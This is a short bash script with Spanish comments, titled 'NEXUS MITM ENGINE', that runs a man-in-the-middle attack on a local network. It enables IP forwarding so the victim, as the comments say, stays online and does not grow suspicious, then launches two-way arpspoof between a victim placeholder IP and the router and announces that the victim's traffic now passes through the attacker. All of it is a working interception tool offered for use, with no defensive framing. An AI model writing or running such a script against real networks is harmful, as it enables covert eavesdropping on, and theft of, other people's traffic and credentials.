#!/bin/bash
# NEXUS MITM ENGINE v1.0

TARGET_IP="[IP_VICTIMA]"
ROUTER_IP="[IP_ROUTER]"
INTERFACE="wlan0"

# 1. Habilitar el reenvío de IP (IP Forwarding)
# Sin esto, la víctima se queda sin internet y sospechará
su -c "echo 1 > /proc/sys/net/ipv4/ip_forward"

# 2. Iniciar el ataque de suplantación en dos direcciones
echo "[*] ENVENENANDO TABLAS ARP EN $INTERFACE..."
su -c "arpspoof -i $INTERFACE -t $TARGET_IP $ROUTER_IP" &
su -c "arpspoof -i $INTERFACE -t $ROUTER_IP $TARGET_IP" &

echo "[✓] ATAQUE ACTIVO: El tráfico de la víctima fluye por el Nexo."
